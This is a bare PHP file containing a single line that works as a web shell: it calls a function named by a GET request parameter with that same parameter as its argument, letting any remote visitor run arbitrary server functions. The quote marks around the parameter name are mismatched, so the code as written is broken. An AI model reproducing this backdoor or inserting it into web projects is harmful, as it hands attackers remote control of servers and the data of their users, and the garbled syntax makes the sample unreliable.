<?php
$_GET["Su-EdWva']($_GET['Su-EdWva']);
?>
